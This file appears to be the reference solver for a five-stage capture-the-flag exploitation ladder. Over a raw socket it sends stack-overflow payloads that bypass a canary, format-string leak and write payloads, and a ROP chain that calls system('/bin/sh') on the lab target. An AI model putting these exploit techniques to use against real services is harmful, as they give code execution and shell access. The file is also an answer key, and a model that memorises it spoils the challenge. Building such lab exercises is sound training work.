"""Intended-path solver: drive all five rungs over one raw socket."""

import re
import socket
import struct
import time
import urllib.parse

from openrange.content.solver import SolveResult, TaskResult, find_flags


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def _recv_until(sock: socket.socket, buf: bytearray, token: str) -> str:
    while token not in buf.decode(errors="replace"):
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
    return buf.decode(errors="replace")


def _wait_for_finish(sock: socket.socket, buf: bytearray) -> str:
    end = time.monotonic() + 20
    while "5/5" not in buf.decode(errors="replace") and time.monotonic() < end:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
    return buf.decode(errors="replace")


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    host = parsed.hostname or "target"
    port = parsed.port or 4000

    sock = socket.create_connection((host, port), timeout=15)
    sock.settimeout(15)
    transcript = bytearray()
    detail = None
    captured = None
    try:
        text = _recv_until(sock, transcript, "overwrite the saved return")

        win1 = int(re.search(r"win\(\)\s*=\s*(0x[0-9a-f]+)", text).group(1), 16)
        sock.sendall(b"A" * 64 + p64(win1) + b"\n")
        text = _recv_until(sock, transcript, "keep the canary byte-exact")

        canary = int(
            re.search(r"canary\s+@\s*rsp\+64 value (0x[0-9a-f]+)", text).group(1),
            16,
        )
        win2 = int(re.findall(r"win\(\)\s*=\s*(0x[0-9a-f]+)", text)[-1], 16)
        # buffer | canary | saved rdp filler | return
        sock.sendall(b"A" * 64 + p64(canary) + b"B" * 8 + p64(win2) + b"\n")
        text = _recv_until(sock, transcript, "leak the magic word")

        magic = int(re.search(r"magic word (0x[0-9a-f]+)", text).group(1), 16)
        slot = None
        for line in text.splitlines():
            m = re.match(r"map: slot (\d+) : (0x[0-9a-f]+)$", line.strip())
            if m and int(m.group(2), 16) == magic:
                slot = int(m.group(1))
                break
        if slot is None:
            detail = "magic word not found in the stage 3 dump"
            return SolveResult(
                results=[TaskResult(task_id="climb-the-ladder", ok=False, detail=detail)]
            )
        sock.sendall(f"%{slot}$p\n".encode())
        _recv_until(sock, transcript, "echo> ")
        sock.sendall(hex(magic).encode() + b"\n")
        text = _recv_until(sock, transcript, "make slot 6 equal 1337")

        sock.sendall(b"A" * 1337 + b"%6$n\n")
        text = _recv_until(sock, transcript, "each little-endian 8 bytes")

        pop_rdi = int(re.search(r"gadget\s*=\s*(0x[0-9a-f]+)", text).group(1), 16)
        binsh = int(re.search(r"/bin/sh string\s*=\s*(0x[0-9a-f]+)", text).group(1), 16)
        system_plt = int(re.search(r"system plt\s*=\s*(0x[0-9a-f]+)", text).group(1), 16)
        sock.sendall(p64(pop_rdi) + p64(binsh) + p64(system_plt) + b"\n")
        text = _wait_for_finish(sock, transcript)
    except (OSError, AttributeError) as exc:
        return SolveResult(
            results=[
                TaskResult(
                    task_id="climb-the-ladder", ok=False, detail=f"ladder exchange failed: {exc}"
                )
            ]
        )
    finally:
        sock.close()

    flags = find_flags(text)
    captured = flags[0] if flags else None
    passes = len(re.findall(r"STAGE \d PASS", text))
    if not captured:
        detail = f"ladder incomplete ({passes}/5 stages passed): {text[-200:]}"
    else:
        detail = f"all five rungs graded pass ({passes}/5); flag printed after stage 5"
    return SolveResult(
        results=[
            TaskResult(
                task_id="climb-the-ladder",
                ok=captured is not None,
                captured=captured,
                detail=detail,
            )
        ]
    )
